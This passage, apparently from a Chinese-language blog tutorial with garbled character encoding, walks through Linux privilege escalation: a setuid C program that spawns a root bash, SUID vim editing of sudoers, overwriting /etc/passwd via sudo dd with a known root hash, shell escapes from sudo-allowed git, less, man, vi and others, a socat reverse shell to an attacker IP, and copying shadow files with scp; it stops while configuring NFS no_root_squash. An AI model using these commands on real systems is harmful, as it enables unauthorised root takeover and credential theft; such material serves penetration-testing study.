<h5 id="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"><a href="#ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell"></a>ï¼ˆ3ï¼‰åˆ©ç”¨Vimè·å–rootæƒé™shell</h5><p>vimåœ¨æœ‰SUIDæƒé™çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ç”¨æ¥è¿›è¡Œææƒæ“ä½œã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830134124700.png" alt="image-20220830134124700"></p>
<p>å½“vimè¢«èµ‹äºˆsuidæƒé™åï¼Œæ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨vimå‘½ä»¤æ¥ç¼–è¾‘é‚£äº›åªèƒ½ç”±rootç¼–è¾‘çš„æ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡vimæ¥ç¼–è¾‘etc/sudoersæ–‡ä»¶ï¼ˆæ™®é€šç”¨æˆ·ä¼šè¢«ç›´æ¥æ‹’ç»è®¿é—®ï¼‰ï¼Œåœ¨sudoersæ–‡ä»¶ä¸­é…ç½®æ™®é€šç”¨æˆ·çš„æƒé™ï¼Œæƒé™å’Œrootä¸€æ ·ï¼Œè¿™é‡Œä»¥testç”¨æˆ·ä¸ºä¾‹ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">test   </span>ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure></div>

<p>vimç¼–è¾‘åä¿å­˜æ—¶ç”¨wq!å¼ºåˆ¶ä¿å­˜ï¼Œvimè¿è¡Œæ—¶è™½ç„¶æ˜¯rootæƒé™ï¼Œä½†wqä¾ç„¶ä¼šæç¤ºåªè¯»ã€‚</p>
<p>éšåsudo bashå°±ä¼šè·å–ä¸€ä¸ªrootçš„shellã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830134159252.png" alt="image-20220830134159252"></p>
<h5 id="ï¼ˆ4ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"><a href="#ï¼ˆ4ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell" class="headerlink" title="ï¼ˆ4ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell"></a>ï¼ˆ4ï¼‰åˆ©ç”¨è„šæœ¬è·å–rootæƒé™shell</h5><p>é™¤äº†ç³»ç»Ÿçš„ä¸€äº›å¯æ‰§è¡Œå‘½ä»¤ï¼Œè‡ªå·±å†™çš„å¯æ‰§è¡Œæ–‡ä»¶ä¹Ÿå¯æ·»åŠ SUIDæƒé™ã€‚ä¸è®ºcæˆ–è€…goæˆ–è€…å…¶ä»–è¯­è¨€éƒ½å¯ä»¥ï¼Œè¿™é‡Œä»¥cä¸ºä¾‹ã€‚</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä½¿ç”¨gccè¿›è¡Œç¼–è¯‘ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830134227202.png" alt="image-20220830134227202"></p>
<p>ç¼–è¯‘åä¼ å…¥ç›®æ ‡æœºï¼Œè¿™é‡Œæ”¾åˆ°bin/aaaç›®å½•ä¸‹ï¼Œç„¶åæ·»åŠ SUIDæƒé™æµ‹è¯•ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830134236889.png" alt="image-20220830134236889"></p>
<p>æ™®é€šç”¨æˆ·æ‰§è¡Œè¯¥æ–‡ä»¶åï¼Œä¼šè¿”å›ä¸€ä¸ªrootæƒé™çš„shellã€‚</p>
<p><img src="/2022/05/31/daily/image-20220830134252824.png" alt="image-20220830134252824"></p>
<h3 id="2ï¼‰åˆ©ç”¨SUDOææƒ"><a href="#2ï¼‰åˆ©ç”¨SUDOææƒ" class="headerlink" title="2ï¼‰åˆ©ç”¨SUDOææƒ"></a>2ï¼‰åˆ©ç”¨SUDOææƒ</h3><h4 id="sudoå’Œsuçš„åŒºåˆ«"><a href="#sudoå’Œsuçš„åŒºåˆ«" class="headerlink" title="sudoå’Œsuçš„åŒºåˆ«"></a><strong>sudoå’Œsuçš„åŒºåˆ«</strong></h4><p>1ï¼Œsudoæ˜¯ä»¥rootæƒé™å»è¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œsuæ˜¯å»åˆ‡æ¢ç”¨æˆ·çš„èº«ä»½ã€‚</p>
<p>2ï¼Œsudoåªè¦çŸ¥é“è‡ªå·±çš„å¯†ç å³å¯ï¼Œsuéœ€è¦çŸ¥é“è¢«åˆ‡æ¢ç”¨æˆ·çš„å¯†ç ã€‚</p>
<h4 id="sudoersæ–‡ä»¶"><a href="#sudoersæ–‡ä»¶" class="headerlink" title="sudoersæ–‡ä»¶"></a><strong>sudoersæ–‡ä»¶</strong></h4><p>/etc/sudoersæ–‡ä»¶ï¼Œæ˜¯sudoæƒé™çš„é…ç½®æ–‡ä»¶ã€‚å½“ä½¿ç”¨sudoæ¥å‘½ä»¤æ—¶ï¼Œlinuxç³»ç»Ÿä¼šåœ¨sudoersæ–‡ä»¶ä¸­æŸ¥æ‰¾å½“å‰ç”¨æˆ·ï¼Œæ ¹æ®å½“å‰ç”¨æˆ·æƒé™é…ç½®æ¥å†³å®šæ˜¯å¦å¯ä»¥è¿è¡Œç›¸å…³å‘½ä»¤ã€‚</p>
<p>ä¾‹å¦‚æ·»åŠ testç”¨æˆ·çš„ç›¸å…³é…ç½®ï¼š</p>
<p><img src="/2022/05/31/daily/image-20220901223741370.png" alt="image-20220901223741370"></p>
<p>æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p><img src="/2022/05/31/daily/image-20220901223808981.png" alt="image-20220901223808981"></p>
<h4 id="sudo-su-amp-amp-sudo-bash"><a href="#sudo-su-amp-amp-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a><strong>sudo su &amp;&amp; sudo bash</strong></h4><p>å½“æ²¡æœ‰å¯¹æ™®é€šç”¨æˆ·åšä¸¥æ ¼çš„é™åˆ¶æ—¶ï¼Œæˆ–è€…é…ç½®æƒé™è¿‡å¤§æ—¶ï¼Œåˆ™å¯ä»¥å°è¯•sudo suæ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901223824172.png" alt="image-20220901223824172"></p>
<p>æˆ–è€…æ‰§è¡Œsudo bashã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901223837242.png" alt="image-20220901223837242"></p>
<p>å½“visudoå‘½ä»¤ä¸èƒ½ç”¨æ—¶ï¼Œé™åˆ¶äº†éƒ¨åˆ†å‘½ä»¤ï¼Œåˆ™å¯ä»¥å°è¯•ä¸‹vimæ˜¯å¦è¢«ç¦ç”¨ï¼Œsudo vimä¹Ÿå¯ä»¥ç¼–è¾‘sudoersæ–‡ä»¶ï¼Œä¸”wq!å¯ä»¥æˆåŠŸä¿å­˜ã€‚</p>
<h5 id="SUDO-dd-ææƒæ³•"><a href="#SUDO-dd-ææƒæ³•" class="headerlink" title="*SUDO -dd ææƒæ³•"></a>*SUDO -dd ææƒæ³•</h5><p><a href="https://www.cnblogs.com/zlgxzswjy/p/12746160.html">åŸæ–‡</a>            </p>
<p>å½“ç”¨æˆ·å¯ä»¥é€šè¿‡sudoæ‰§è¡Œddå‘½ä»¤æ—¶ï¼Œå¯ä»¥è¢«ç”¨æ¥ææƒã€‚é€šè¿‡ddå‘½ä»¤è¦†ç›–åŸå§‹/etc/passwdæ–‡ä»¶ï¼Œä»¥è¾¾åˆ°ä¿®æ”¹å¯†ç çš„ç›®çš„</p>
<p>1ã€åˆ›å»ºä¸€ä¸ªå·²çŸ¥å¯†ç çš„hashï¼Œä»¥å¤‡æ›¿æ¢æ—¶ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/etc</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span> -salt <span class="number">123</span> password </span><br><span class="line"><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="title class_">KRa5a</span>.</span><br></pre></td></tr></table></figure></div>

<p>2ã€å¤‡ä»½åŸå§‹passwdæ–‡ä»¶ï¼Œä»¥é˜²ä¿®æ”¹é”™è¯¯æ—¶æ— æ³•è®¿é—®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line"># cp <span class="regexp">/etc/</span>passwd <span class="regexp">/tmp/</span>passwd</span><br></pre></td></tr></table></figure></div>

<p>3ã€åˆ©ç”¨ç¬¬ä¸€æ­¥é‡Œç”Ÿæˆçš„hashæ„å»ºæ–°çš„passwd hashæ¡ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment"># cat passwd</span></span><br><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$123</span><span class="variable">$0HaaUtbhct</span>/mZ/Q/<span class="symbol">KRa5a.:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>

<p>4ã€ä½¿ç”¨ddè¦†ç›–åŸå§‹passwdæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hh</span>@hh:/tmp$ cat passwd|sudo dd of=/etc/passwd </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records in </span><br><span class="line"><span class="attribute">3</span>+<span class="number">1</span> records out</span><br><span class="line"><span class="attribute">1757</span> bytes (<span class="number">1</span>.<span class="number">8</span> kB, <span class="number">1</span>.<span class="number">7</span> KiB) copied, <span class="number">0</span>.<span class="number">000397129</span> s, <span class="number">4</span>.<span class="number">4</span> MB/s</span><br></pre></td></tr></table></figure></div>

<p>5ã€ä½¿ç”¨åˆšæ‰åˆ›å»ºhashæ—¶ä½¿ç”¨çš„å¯†ç è¿›è¡Œç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">hh<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="variable">$su</span> root</span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">root<span class="variable">@hh</span><span class="symbol">:/tmp</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>ææƒæˆåŠŸï¼</p>
<h5 id="GIT"><a href="#GIT" class="headerlink" title="*GIT"></a>*GIT</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br><span class="line"><span class="regexp">//</span>åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/05/31/daily/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>å°±å¯ä»¥å‘ç°rootä»¥nopasswdã€ä¸éœ€è¦å¯†ç ã€‘è¿è¡Œgitå‘½ä»¤</u></p>
<p>åŸç†æ˜¯gitå­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼Œ</p>
<p>åœ¨ä½¿ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸éœ€è¦è¾“å…¥rootå¯†ç ï¼Œå³å¯ä»¥rootèº«ä»½æ‰§è¡Œè¿™æ¡å‘½ä»¤</p>
<p>æ“ä½œå¦‚ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">sudo git -p     </span><br><span class="line"><span class="regexp">//</span>-pæ˜¯åˆ†é¡µæŸ¥çœ‹ï¼Œè¿™ä¸ªåŸç†å°±æ˜¯ç»ˆç«¯çš„çª—å£å¤§å°ä¸å¤Ÿæ˜¾ç¤ºï¼Œæ‰€ä»¥ä¸‹æ–¹ä¼šå‡ºç°å†’å·ï¼Œç­‰å¾…è¾“å…¥å‘½ä»¤</span><br></pre></td></tr></table></figure></div>

<p>ä¸‹é¢å¯ä»¥çœ‹çœ‹åŒºåˆ«</p>
<h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="*æ³¨æ„"></a>*æ³¨æ„</h6><p>1.çª—å£è¶³å¤Ÿå¤§</p>
<p><img src="/2022/05/31/daily/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºå®Œäº†ï¼Œå°±æœ‰å›åˆ°åŸå¤„äº†</p>
<p>2.çª—å£å°ä¸€äº›</p>
<p><img src="/2022/05/31/daily/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>ä¸‹æ–¹å°±æ˜¾ç¤ºå‡º:ï¼Œç­‰å¾…è¾“å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">**:æ˜¯è‡ªå¸¦æœ‰çš„ï¼Œä¸æ˜¯è¾“å…¥çš„</span><br><span class="line">:!/bin/sh    //æ„Ÿå¹å·!æ˜¯shellè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥è¦é¿å…sudoæˆæƒç”¨æˆ·ä½¿ç”¨viï¼Œvimï¼Œftpï¼Œleeï¼Œmoreï¼Œgit</span><br><span class="line">è¿›å…¥root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">å½“ç„¶ä¹Ÿå¯ä»¥æ‰§è¡Œ:!passwd root</span><br><span class="line">ä¿®æ”¹å…¶å¯†ç </span><br><span class="line">ç„¶åsu rootç™»å½•ä¹Ÿå¯</span><br></pre></td></tr></table></figure></div>

<h6 id="1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"><a href="#1-æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell" class="headerlink" title="1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell"></a>1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</h6><p>$å˜æˆ#æˆåŠŸ</p>
<p><img src="/2022/05/31/daily/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h6 id="2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•"><a href="#2-ä¿®æ”¹å¯†ç ï¼Œç™»å½•" class="headerlink" title="2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•"></a>2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</h6><p><img src="/2022/05/31/daily/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p>$å˜æˆ#ï¼ŒæˆåŠŸç™»å½•</p>
<p><img src="/2022/05/31/daily/image-20220901114726423.png" alt="image-20220901114726423"></p>
<h5 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a><strong>å…¶ä»–å‘½ä»¤</strong></h5><p>ä¹Ÿæœ‰å¾ˆå¤šå…¶ä»–å‘½ä»¤å¯ä»¥ç”¨æ¥ææƒï¼Œå’Œä¹‹å‰çš„SUIDææƒä¸­è¯´çš„å‘½ä»¤ç±»ä¼¼ï¼Œä¾‹å¦‚sudoå…è®¸findå‘½ä»¤ï¼Œåˆ™å¯ä»¥é€šè¿‡execå‚æ•°æ¥åˆ‡æ¢åˆ°rootæƒé™ã€‚</p>
<p>è¿™é‡Œæ·»åŠ æ–°ç”¨æˆ·aaaï¼Œå¹¶ä¿®æ”¹sudoersæ–‡ä»¶ï¼Œå…è®¸éƒ¨åˆ†å‘½ä»¤ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure></div>



<p>è¿™æ—¶aaaç”¨æˆ·ä½¿ç”¨sudoå°±åªèƒ½æ‰§è¡Œé…ç½®å¥½çš„å‘½ä»¤ï¼Œsudo suå’Œsudo bashè¢«ç¦æ­¢æ‰§è¡Œã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224325691.png" alt="image-20220901224325691"></p>
<p>ç›¸å…³å‘½ä»¤ææƒæ–¹å¼å¦‚ä¸‹ï¼š</p>
<h6 id="findï¼š"><a href="#findï¼š" class="headerlink" title="findï¼š"></a>findï¼š</h6><p>execå‚æ•°ç”¨æ¥æŒ‡å®šæœç´¢ç»“æœçš„å¤„ç†å‘½ä»¤ï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œåˆ†å·åœ¨å‘½ä»¤è¡Œæœ‰ç‰¹æ®Šå‡½æ•°ï¼Œè¦ç”¨\è¿›è¡Œè½¬ä¹‰ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224342169.png" alt="image-20220901224342169"></p>
<h6 id="perlï¼š"><a href="#perlï¼š" class="headerlink" title="perlï¼š"></a>perlï¼š</h6><p>eå‚æ•°ç”¨æ¥æŒ‡å®šè¦è¿è¡Œçš„å‘½ä»¤ï¼Œç„¶åä½¿ç”¨linuxçš„execå‚æ•°æ¥è°ƒç”¨bashã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224356163.png" alt="image-20220901224356163"></p>
<h6 id="pythonï¼š"><a href="#pythonï¼š" class="headerlink" title="pythonï¼š"></a>pythonï¼š</h6><p>cå‚æ•°å¯ä»¥åœ¨å‘½ä»¤è¡Œæ‰§è¡Œpythonä»£ç ï¼Œptyåº“æ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯åº“ï¼Œå®ƒçš„spawnä¼šè°ƒç”¨æŒ‡å®šçš„ç¨‹åºã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224409127.png" alt="image-20220901224409127"></p>
<h6 id="lessï¼š"><a href="#lessï¼š" class="headerlink" title="lessï¼š"></a>lessï¼š</h6><p>è¾“å…¥sudo less /etc/hostså‘½ä»¤æµè§ˆæ–‡ä»¶å†…å®¹æ—¶ï¼Œåˆ°åº•éƒ¨è¾“å…¥!bashåå›è½¦ï¼Œä¼šè·å¾—ä¸€ä¸ªrootæƒé™çš„shellã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224420552.png" alt="image-20220901224420552"></p>
<p><img src="/2022/05/31/daily/image-20220901224511943.png" alt="image-20220901224511943"></p>
<h6 id="awkï¼š"><a href="#awkï¼š" class="headerlink" title="awkï¼š"></a>awkï¼š</h6><p>é€šè¿‡è°ƒç”¨linuxçš„systemå‡½æ•°æ¥æ‰“å¼€bashã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224431624.png" alt="image-20220901224431624"></p>
<h6 id="manï¼š"><a href="#manï¼š" class="headerlink" title="manï¼š"></a>manï¼š</h6><p>é€šè¿‡sudo man manå‘½ä»¤æ¥æ‰“å¼€mançš„ä½¿ç”¨æ‰‹å†Œï¼ŒåŒæ—¶ä¼šè¿›å…¥ç¼–è¾‘è¡Œï¼Œè¾“å…¥!bashå›è½¦ï¼Œå¯è·å–rootæƒé™ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224541655.png" alt="image-20220901224541655"></p>
<p><img src="/2022/05/31/daily/image-20220901224551402.png" alt="image-20220901224551402"></p>
<h6 id="viï¼š"><a href="#viï¼š" class="headerlink" title="*viï¼š"></a>*viï¼š</h6><p>sudo viä¼šè¿›å…¥vié»˜è®¤é¡µï¼Œè¾“å…¥:!bashå›è½¦ï¼Œå¯è¿›å…¥rootå‘½ä»¤è¡Œã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224609706.png" alt="image-20220901224609706"></p>
<p><img src="/2022/05/31/daily/image-20220901224622369.png" alt="image-20220901224622369"></p>
<h6 id="è„šæœ¬ï¼š"><a href="#è„šæœ¬ï¼š" class="headerlink" title="è„šæœ¬ï¼š"></a>è„šæœ¬ï¼š</h6><p>å¦‚æœsudoerså®šä¹‰äº†å¯ä»¥æ‰§è¡ŒæŸä¸ªè„šæœ¬ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥æŠŠè¿”å›shellçš„ä»£ç æ·»åŠ è¿›å»ã€‚</p>
<p>ä¾‹å¦‚æ¡Œé¢æœ‰ä¸ªè¿ç»´éœ€è¦çš„aaa.shæ–‡ä»¶ï¼Œæˆ‘ä»¬æ·»åŠ ä¸€æ®µæ‰“å¼€bashçš„ä»£ç ï¼Œç„¶åsudoè¿è¡Œå³å¯ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901224639423.png" alt="image-20220901224639423"></p>
<p>å‚è€ƒä»£ç ï¼š</p>
<p><img src="/2022/05/31/daily/image-20220901224909264.png" alt="image-20220901224909264"></p>
<h5 id="åº”ç”¨ç¨‹åº"><a href="#åº”ç”¨ç¨‹åº" class="headerlink" title="åº”ç”¨ç¨‹åº"></a><strong>åº”ç”¨ç¨‹åº</strong></h5><p>é™¤äº†ä¸Šé¢çš„ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¹Ÿå¯ä»¥è·å–rootæƒé™ï¼Œä¾‹å¦‚envã€ftpã€socatã€scpã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901225004858.png" alt="image-20220901225004858"></p>
<h6 id="envï¼š"><a href="#envï¼š" class="headerlink" title="envï¼š"></a>envï¼š</h6><p>é€šè¿‡envç¯å¢ƒå˜é‡æ¥è·å–rootæƒé™ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901225022285.png" alt="image-20220901225022285"></p>
<h6 id="ftpï¼š"><a href="#ftpï¼š" class="headerlink" title="ftpï¼š"></a>ftpï¼š</h6><p>é€šè¿‡ftpæ¥è¿›å…¥bashè·å–rootæƒé™ã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901225031965.png" alt="image-20220901225031965"></p>
<h6 id="socatï¼š"><a href="#socatï¼š" class="headerlink" title="socatï¼š"></a>socatï¼š</h6><p>é€šè¿‡socatå®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾—rootshellã€‚å…ˆæ‰§è¡ŒæœåŠ¡ç«¯ï¼Œåæ‰§è¡Œå®¢æˆ·ç«¯ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">æ”»å‡»æœºæ‰§è¡Œï¼š</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure></div>



<p><img src="/2022/05/31/daily/image-20220901225047468.png" alt="image-20220901225047468"></p>
<p><img src="/2022/05/31/daily/image-20220901225056003.png" alt="image-20220901225056003"></p>
<h6 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h6><p>è¿˜æœ‰ä¸€ä¸ªscpï¼Œscpæ˜¯ä¸€ä¸ªå®‰å…¨å¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤ï¼Œå®ƒæ— æ³•è·å–ä¸€ä¸ªshellï¼Œä½†å¯ä»¥ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶ã€‚ä¾‹å¦‚etc/passwdã€etc/shadowç­‰ã€‚</p>
<p>å¦‚ä¸‹å‘½ä»¤ï¼Œå°†passwdæ–‡ä»¶ä¼ è¾“åˆ°æŒ‡å®šæœºå™¨çš„root/Desktopä¸‹ï¼Œç„¶åå†å¯¹å¯†ç è¿›è¡Œç ´è§£ç­‰æ“ä½œã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901225110501.png" alt="image-20220901225110501"></p>
<h5 id="é»‘åå•æƒ…å†µ"><a href="#é»‘åå•æƒ…å†µ" class="headerlink" title="é»‘åå•æƒ…å†µ"></a><strong>é»‘åå•æƒ…å†µ</strong></h5><p>å¦‚æœç¢°åˆ°sudoersæ–‡ä»¶ä½¿ç”¨é»‘åå•çš„æƒ…å†µï¼Œæ¯”å¦‚è¯´æƒé™ç¦ç”¨sudoä½¿ç”¨findå‘½ä»¤ï¼Œä½†æ˜¯éƒ½æ˜¯åœ¨ALLåŸºç¡€ä¸Šè®¾ç½®çš„ï¼Œé‚£ä¹ˆå¯ä»¥cpæŠŠfindå¤åˆ¶åˆ°å…¶å®ƒç›®å½•è¿è¡Œã€‚</p>
<p><img src="/2022/05/31/daily/image-20220901225127772.png" alt="image-20220901225127772"></p>
<h3 id="3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"><a href="#3-NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ" class="headerlink" title="3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ"></a>3) NFSé…ç½®ä¸å½“å¯¼è‡´ææƒ</h3><h4 id="NFSä»‹ç»"><a href="#NFSä»‹ç»" class="headerlink" title="NFSä»‹ç»"></a>NFSä»‹ç»</h4><p>NFSæ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«ã€‚</p>
<p>è¿™é‡Œä»¥ubuntuä¸ºä¾‹ï¼Œç®€å•é…ç½®ä¸€ä¸‹ï¼š</p>
<p>é¦–å…ˆå®‰è£…nfsæœåŠ¡ç«¯ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure></div>



<p>å®‰è£…åä¿®æ”¹é…ç½®æ–‡ä»¶/etc/exportsï¼Œè¿™é‡Œå°†homeç›®å½•è¿›è¡ŒæŒ‚è½½å…±äº«ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure></div>



